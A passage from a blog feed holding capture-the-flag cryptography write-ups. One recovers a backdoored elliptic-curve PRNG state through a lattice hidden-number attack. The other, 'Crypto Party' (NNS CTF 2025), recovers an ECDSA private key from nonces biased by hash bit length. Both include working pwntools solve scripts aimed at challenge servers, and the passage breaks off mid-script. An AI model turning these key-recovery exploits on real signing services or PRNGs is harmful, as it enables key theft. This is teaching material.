        <span class="p">[</span><span class="n">identity_matrix</span><span class="p">(</span><span class="n">QQ</span><span class="p">,</span><span class="n">n</span><span class="p">)</span><span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="n">zero_matrix</span><span class="p">(</span><span class="n">n</span><span class="p">,</span><span class="mi">2</span><span class="p">)],</span>
        <span class="p">[</span><span class="n">matrix</span><span class="p">(</span><span class="n">t</span><span class="p">),</span>               <span class="n">matrix</span><span class="p">([</span><span class="n">B</span><span class="o">/</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">])],</span>
        <span class="p">[</span><span class="n">matrix</span><span class="p">(</span><span class="n">a</span><span class="p">),</span>               <span class="n">matrix</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span>   <span class="n">B</span><span class="p">])]</span>
    <span class="p">])</span>
    <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">M</span><span class="p">.</span><span class="n">LLL</span><span class="p">():</span>
        <span class="k">if</span> <span class="nb">abs</span><span class="p">(</span><span class="n">row</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span> <span class="o">==</span> <span class="n">B</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">row</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span><span class="o">*</span><span class="n">p</span><span class="o">/</span><span class="n">B</span> <span class="o">%</span> <span class="n">p</span>
</code></pre></div></div>

<h5 id="recovering-the-prng-state">Recovering the PRNG state</h5>

<p>The PRNG does:</p>

\[\large \begin{align}
\nonumber R_{i} &amp;= (state_{i} \cdot Q).x  \\
\nonumber state_{i+1} &amp;= (state_{i} \cdot P).x  \\
\nonumber P &amp;= secret \cdot Q
\end{align}\]

<p>With the secret $s$ and a random value $R_{0}$ from menu option 2, we can lift $R_{1}$ on the curve to recover the point $state_{i} \cdot Q$.
Since the next state is computed as $(state_{i} \cdot P).x$, we can substitute for $P$:</p>

\[\large state_{i+1} = (state_{i} \cdot secret \cdot Q).x\]

<p>So, by lifting $R_{0}$, we can compute the next state. This state can be used to directly infer the ECB encryption key, if <code class="language-plaintext highlighter-rouge">get flag</code> is the next menu option:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Ppub</span><span class="p">,</span> <span class="n">Qpub</span> <span class="o">=</span> <span class="n">get_PQ</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
<span class="n">R1</span> <span class="o">=</span> <span class="n">get_random</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
<span class="n">state0</span> <span class="o">=</span> <span class="p">(</span><span class="n">E</span><span class="p">.</span><span class="n">lift_x</span><span class="p">(</span><span class="n">R1</span><span class="p">)</span> <span class="o">*</span> <span class="n">secret</span><span class="p">).</span><span class="n">x</span><span class="p">()</span>
<span class="n">R2</span> <span class="o">=</span> <span class="p">(</span><span class="n">Qpub</span> <span class="o">*</span> <span class="n">state0</span><span class="p">).</span><span class="n">x</span><span class="p">()</span>

<span class="n">key</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">R2</span><span class="p">))[</span><span class="o">-</span><span class="mi">16</span><span class="p">:]</span>
<span class="n">ct</span> <span class="o">=</span> <span class="n">get_flag</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
<span class="n">pt</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_ECB</span><span class="p">).</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ct</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">unpad</span><span class="p">(</span><span class="n">pt</span><span class="p">,</span><span class="mi">16</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
</code></pre></div></div>

<p>Which gets us our flag:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wack{N54_4pr0V3d}
</code></pre></div></div>

<h5 id="solvesage">Solve.sage</h5>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span> <span class="nn">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">unpad</span>
<span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="c1"># P-256 params
</span><span class="n">P</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF</span>
<span class="n">A</span> <span class="o">=</span> <span class="o">-</span><span class="mi">3</span>
<span class="n">B</span> <span class="o">=</span> <span class="mh">0x5AC635D8AA3A93E7B3EBBD55769886BC651D06B0CC53B0F63BCE3C3E27D2604B</span>
<span class="n">N</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551</span>
<span class="n">F</span> <span class="o">=</span> <span class="n">GF</span><span class="p">(</span><span class="n">P</span><span class="p">)</span>
<span class="n">E</span> <span class="o">=</span> <span class="n">EllipticCurve</span><span class="p">(</span><span class="n">F</span><span class="p">,</span> <span class="p">[</span><span class="n">A</span><span class="p">,</span> <span class="n">B</span><span class="p">])</span>

<span class="k">def</span> <span class="nf">get_info</span><span class="p">(</span><span class="n">io</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"hints</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">a</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">decode</span><span class="p">().</span><span class="n">strip</span><span class="p">()[</span><span class="mi">2</span><span class="p">:])</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1">#b?
</span>    <span class="n">c</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">decode</span><span class="p">().</span><span class="n">strip</span><span class="p">()[</span><span class="mi">2</span><span class="p">:])</span>
    <span class="n">d</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">decode</span><span class="p">().</span><span class="n">strip</span><span class="p">()[</span><span class="mi">2</span><span class="p">:])</span>
    <span class="k">return</span> <span class="n">a</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">d</span>

<span class="k">def</span> <span class="nf">get_random</span><span class="p">(</span><span class="n">io</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">Integer</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">decode</span><span class="p">().</span><span class="n">strip</span><span class="p">()[</span><span class="mi">15</span><span class="p">:])</span>

<span class="k">def</span> <span class="nf">get_flag</span><span class="p">(</span><span class="n">io</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">decode</span><span class="p">().</span><span class="n">strip</span><span class="p">()[</span><span class="mi">7</span><span class="p">:])</span>

<span class="k">def</span> <span class="nf">get_PQ</span><span class="p">(</span><span class="n">io</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">,</span><span class="sa">b</span><span class="s">"4"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"P = X: "</span><span class="p">)</span>
    <span class="n">Px</span> <span class="o">=</span> <span class="n">Integer</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">decode</span><span class="p">().</span><span class="n">strip</span><span class="p">())</span>
    <span class="n">Py</span> <span class="o">=</span> <span class="n">Integer</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">decode</span><span class="p">().</span><span class="n">strip</span><span class="p">()[</span><span class="mi">3</span><span class="p">:])</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Q = X: "</span><span class="p">)</span>
    <span class="n">Qx</span> <span class="o">=</span> <span class="n">Integer</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">decode</span><span class="p">().</span><span class="n">strip</span><span class="p">())</span>
    <span class="n">Qy</span> <span class="o">=</span> <span class="n">Integer</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">decode</span><span class="p">().</span><span class="n">strip</span><span class="p">()[</span><span class="mi">3</span><span class="p">:])</span>
    <span class="k">return</span> <span class="n">E</span><span class="p">(</span><span class="n">Px</span><span class="p">,</span><span class="n">Py</span><span class="p">),</span> <span class="n">E</span><span class="p">(</span><span class="n">Qx</span><span class="p">,</span><span class="n">Qy</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">HNP</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">t</span><span class="p">,</span><span class="n">p</span><span class="p">,</span><span class="n">B</span><span class="p">):</span>
    <span class="n">n</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">M</span> <span class="o">=</span> <span class="n">block_matrix</span><span class="p">([</span>
        <span class="p">[</span><span class="n">identity_matrix</span><span class="p">(</span><span class="n">QQ</span><span class="p">,</span><span class="n">n</span><span class="p">)</span><span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="n">zero_matrix</span><span class="p">(</span><span class="n">n</span><span class="p">,</span><span class="mi">2</span><span class="p">)],</span>
        <span class="p">[</span><span class="n">matrix</span><span class="p">(</span><span class="n">t</span><span class="p">),</span>               <span class="n">matrix</span><span class="p">([</span><span class="n">B</span><span class="o">/</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">])],</span>
        <span class="p">[</span><span class="n">matrix</span><span class="p">(</span><span class="n">a</span><span class="p">),</span>               <span class="n">matrix</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span>   <span class="n">B</span><span class="p">])]</span>
    <span class="p">])</span>
    <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">M</span><span class="p">.</span><span class="n">LLL</span><span class="p">():</span>
        <span class="k">if</span> <span class="nb">abs</span><span class="p">(</span><span class="n">row</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span> <span class="o">==</span> <span class="n">B</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">row</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span><span class="o">*</span><span class="n">p</span><span class="o">/</span><span class="n">B</span> <span class="o">%</span> <span class="n">p</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"ctf.wackattack.eu"</span><span class="p">,</span> <span class="mi">8085</span><span class="p">)</span>

<span class="n">num_samples</span> <span class="o">=</span> <span class="mi">10</span>
<span class="n">samples</span> <span class="o">=</span> <span class="p">[</span><span class="n">get_info</span><span class="p">(</span><span class="n">io</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_samples</span><span class="p">)]</span>

<span class="n">t_vec</span><span class="p">,</span> <span class="n">a_vec</span> <span class="o">=</span> <span class="p">[],</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">num_samples</span><span class="p">):</span>
    <span class="n">ai</span><span class="p">,</span> <span class="n">ci</span><span class="p">,</span> <span class="n">di</span> <span class="o">=</span> <span class="n">samples</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
    <span class="n">a0</span><span class="p">,</span> <span class="n">c0</span><span class="p">,</span> <span class="n">d0</span> <span class="o">=</span> <span class="n">samples</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">inv_di</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">di</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span>
    <span class="n">inv_d0</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">d0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span>
    <span class="n">t</span> <span class="o">=</span> <span class="p">(</span><span class="n">ci</span> <span class="o">*</span> <span class="n">inv_di</span> <span class="o">-</span> <span class="n">c0</span> <span class="o">*</span> <span class="n">inv_d0</span><span class="p">)</span> <span class="o">%</span> <span class="n">N</span>
    <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="n">ai</span> <span class="o">*</span> <span class="n">inv_di</span> <span class="o">-</span> <span class="n">a0</span> <span class="o">*</span> <span class="n">inv_d0</span><span class="p">)</span> <span class="o">%</span> <span class="n">N</span>
    <span class="n">t_vec</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
    <span class="n">a_vec</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>

<span class="n">B</span> <span class="o">=</span> <span class="mi">2</span><span class="o">^</span><span class="mi">128</span>
<span class="n">secret</span> <span class="o">=</span> <span class="n">HNP</span><span class="p">(</span><span class="n">a_vec</span><span class="p">,</span> <span class="n">t_vec</span><span class="p">,</span> <span class="n">N</span><span class="p">,</span> <span class="n">B</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Recovered secret: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">secret</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="n">Ppub</span><span class="p">,</span> <span class="n">Qpub</span> <span class="o">=</span> <span class="n">get_PQ</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
<span class="n">R1</span> <span class="o">=</span> <span class="n">get_random</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
<span class="n">state0</span> <span class="o">=</span> <span class="p">(</span><span class="n">E</span><span class="p">.</span><span class="n">lift_x</span><span class="p">(</span><span class="n">R1</span><span class="p">)</span> <span class="o">*</span> <span class="n">secret</span><span class="p">).</span><span class="n">x</span><span class="p">()</span>
<span class="n">R2</span> <span class="o">=</span> <span class="p">(</span><span class="n">Qpub</span> <span class="o">*</span> <span class="n">state0</span><span class="p">).</span><span class="n">x</span><span class="p">()</span>

<span class="n">key</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">R2</span><span class="p">))[</span><span class="o">-</span><span class="mi">16</span><span class="p">:]</span>
<span class="n">ct</span> <span class="o">=</span> <span class="n">get_flag</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
<span class="n">pt</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_ECB</span><span class="p">).</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ct</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">unpad</span><span class="p">(</span><span class="n">pt</span><span class="p">,</span><span class="mi">16</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>]]></content><author><name>Zukane</name></author><category term="writeups" /><category term="Elliptic Curve" /><category term="PRNG" /><category term="Hidden Number Problem" /><summary type="html"><![CDATA[Challenge overview]]></summary></entry><entry><title type="html">Crypto Party (NNS CTF 2025)</title><link href="https://zukane.github.io/crypto-party/" rel="alternate" type="text/html" title="Crypto Party (NNS CTF 2025)" /><published>2025-08-31T12:00:00+02:00</published><updated>2025-08-31T12:00:00+02:00</updated><id>https://zukane.github.io/crypto-party</id><content type="html" xml:base="https://zukane.github.io/crypto-party/"><![CDATA[<h5 id="challenge-overview">Challenge overview</h5>

<p>In this CTF challenge, we are given the source code of a signature service:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">bytes_to_long</span>
<span class="kn">from</span> <span class="nn">secrets</span> <span class="kn">import</span> <span class="n">randbits</span>
<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha384</span>
<span class="kn">from</span> <span class="nn">ecdsa</span> <span class="kn">import</span> <span class="n">curves</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="n">secret_key</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">getenv</span><span class="p">(</span><span class="s">"FLAG"</span><span class="p">,</span> <span class="s">"NNS{fake_flag}"</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
<span class="n">MAX_INVITES</span> <span class="o">=</span> <span class="mi">15</span>

<span class="n">curve_obj</span> <span class="o">=</span> <span class="n">curves</span><span class="p">.</span><span class="n">NIST384p</span>
<span class="n">G</span> <span class="o">=</span> <span class="n">curve_obj</span><span class="p">.</span><span class="n">generator</span>
<span class="n">n</span> <span class="o">=</span> <span class="n">curve_obj</span><span class="p">.</span><span class="n">order</span>

<span class="k">def</span> <span class="nf">invite</span><span class="p">(</span><span class="n">m</span><span class="p">):</span>
    <span class="n">h</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">sha384</span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">digest</span><span class="p">())</span>
    <span class="n">k</span> <span class="o">=</span> <span class="n">randbits</span><span class="p">(</span><span class="n">h</span><span class="p">.</span><span class="n">bit_length</span><span class="p">())</span>
    <span class="n">P</span> <span class="o">=</span> <span class="n">k</span> <span class="o">*</span> <span class="n">G</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">P</span><span class="p">.</span><span class="n">x</span><span class="p">()</span> <span class="o">%</span> <span class="n">n</span>
    <span class="n">s</span> <span class="o">=</span> <span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">h</span> <span class="o">+</span> <span class="n">r</span> <span class="o">*</span> <span class="n">secret_key</span><span class="p">))</span> <span class="o">%</span> <span class="n">n</span>
    <span class="k">return</span> <span class="n">r</span><span class="p">,</span> <span class="n">s</span>

<span class="k">try</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Wassup"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"The guest list is a bit crammed, but you can invite up to </span><span class="si">{</span><span class="n">MAX_INVITES</span><span class="si">}</span><span class="s"> friends."</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">MAX_INVITES</span><span class="p">):</span>
        <span class="n">m</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Enter the name of your friend: "</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
        <span class="n">r</span><span class="p">,</span> <span class="n">s</span> <span class="o">=</span> <span class="n">invite</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Alright, here is </span><span class="si">{</span><span class="n">m</span><span class="si">}</span><span class="s">'s invite code:"</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Invitation code = </span><span class="si">{</span><span class="n">r</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">s</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="k">pass</span>
</code></pre></div></div>

<p>We can sign 15 messages of our choice.</p>

<h5 id="cranking-up-the-bias">Cranking up the bias</h5>

<p>The nonce $k$ is a random $N$-bit number where $N$ is the number of bits in the hash $h$. SHA384 is used to hash the messages $m$. Since the value is converted to a long, leading zero-bits are not preserved. This means we can find messages that hash to low-bit values, giving us biased nonces.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">h</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">sha384</span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">digest</span><span class="p">())</span>
<span class="n">k</span> <span class="o">=</span> <span class="n">randbits</span><span class="p">(</span><span class="n">h</span><span class="p">.</span><span class="n">bit_length</span><span class="p">())</span>
</code></pre></div></div>

<p>With 15 signatures and the P384 curve, the nonce requires $x$ biased bits for the hidden number problem to work:</p>

\[\large \log_{2}(B) \leq \left[ \frac{\log_{2}(n)\cdot (m-1)}{m} - \frac{\log_{2}(m)}{2} \right]\]

<p>where $B$ is the upper bound for the nonce $k$, $n$ is the order and $m$ is the number of signatures.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sage</span><span class="p">:</span> <span class="mi">384</span> <span class="o">-</span> <span class="nb">float</span><span class="p">((</span><span class="n">log</span><span class="p">(</span><span class="n">n</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">MAX_INVITES</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">/</span> <span class="n">MAX_INVITES</span><span class="p">)</span><span class="o">-</span><span class="p">(</span><span class="n">log</span><span class="p">(</span><span class="n">MAX_INVITES</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">))</span>
<span class="mf">27.553445297804274</span>
</code></pre></div></div>

<p>So we need around 28 bits of leading zeroes for the hashes. Such a message can be brute-forced in Python, but is a lot faster in a lower-level language like C++ or Rust. In reality, I found that 26 bits of leading zeroes works most of the time. One such message is:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sage</span><span class="p">:</span> <span class="n">m</span> <span class="o">=</span> <span class="s">"5831510802864336587"</span>
<span class="n">sage</span><span class="p">:</span> <span class="n">h</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">sha384</span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">digest</span><span class="p">())</span>
<span class="n">sage</span><span class="p">:</span> <span class="n">h</span><span class="p">.</span><span class="n">bit_length</span><span class="p">()</span>
<span class="mi">358</span>
</code></pre></div></div>

<p>The same message can be used across signatures, so finding $15$ such messages is not necessary.</p>

<h5 id="recovering-the-private-key">Recovering the private key</h5>

<p>With the message $m$, we can query the service for $15$ signatures:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">m_list</span> <span class="o">=</span> <span class="p">[</span><span class="s">"5831510802864336587"</span><span class="p">]</span> <span class="o">*</span> <span class="mi">15</span>
<span class="n">h_list</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">r_list</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">s_list</span> <span class="o">=</span> <span class="p">[]</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"redacted.chall.nnsc.tf"</span><span class="p">,</span> <span class="mi">41337</span><span class="p">,</span> <span class="n">ssl</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"friends.</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
<span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">m_list</span><span class="p">:</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
    <span class="n">r</span><span class="p">,</span><span class="n">s</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">"="</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">":"</span><span class="p">)</span>
    <span class="n">r_list</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">strip</span><span class="p">()))</span>
    <span class="n">s_list</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">strip</span><span class="p">()))</span>
    <span class="n">h_list</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">bytes_to_long</span><span class="p">(</span><span class="n">sha384</span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">digest</span><span class="p">()))</span>
<span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>

<p>With $(r,s,h)$ its just standard a standard hidden number problem instance with zero-msb. I used the implementation from https://github.com/jvdsn/crypto-attacks/tree/master.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">TOTAL_BITS</span> <span class="o">=</span> <span class="mi">384</span>
<span class="n">KNOWN_BITS</span> <span class="o">=</span> <span class="n">TOTAL_BITS</span> <span class="o">-</span> <span class="n">TARGET</span>
<span class="n">MASK_TOP</span> <span class="o">=</span> <span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">KNOWN_BITS</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">TOTAL_BITS</span> <span class="o">-</span> <span class="n">KNOWN_BITS</span><span class="p">)</span> 
<span class="n">KNOWN_VALUE</span> <span class="o">=</span> <span class="mi">0</span>  <span class="c1"># all top bits are 0
</span>
<span class="n">k_partial</span> <span class="o">=</span> <span class="p">[</span><span class="n">PartialInteger</span><span class="p">(</span><span class="n">KNOWN_VALUE</span><span class="p">,</span> <span class="n">MASK_TOP</span><span class="p">,</span> <span class="n">TOTAL_BITS</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">r_list</span><span class="p">))]</span>
<span class="k">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">dsa_known_msb</span><span class="p">(</span><span class="n">E</span><span class="p">.</span><span class="n">order</span><span class="p">(),</span> <span class="n">h_list</span><span class="p">,</span> <span class="n">r_list</span><span class="p">,</span> <span class="n">s_list</span><span class="p">,</span> <span class="n">k_partial</span><span class="p">))[</span><span class="mi">0</span><span class="p">]))</span>
<span class="c1"># b'NNS{cr4nk_up_th3_bi4s5_y0_354910379ead}'
</span></code></pre></div></div>

<h5 id="solve-script">Solve script</h5>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha384</span>
<span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span><span class="p">,</span> <span class="n">bytes_to_long</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">process</span><span class="p">,</span> <span class="n">remote</span>

<span class="n">p</span> <span class="o">=</span> <span class="mh">0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffeffffffff0000000000000000ffffffff</span>
<span class="n">a</span> <span class="o">=</span> <span class="mh">0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffeffffffff0000000000000000fffffffc</span>
<span class="n">b</span> <span class="o">=</span> <span class="mh">0xb3312fa7e23ee7e4988e056be3f82d19181d9c6efe8141120314088f5013875ac656398d8a2ed19d2a85c8edd3ec2aef</span>
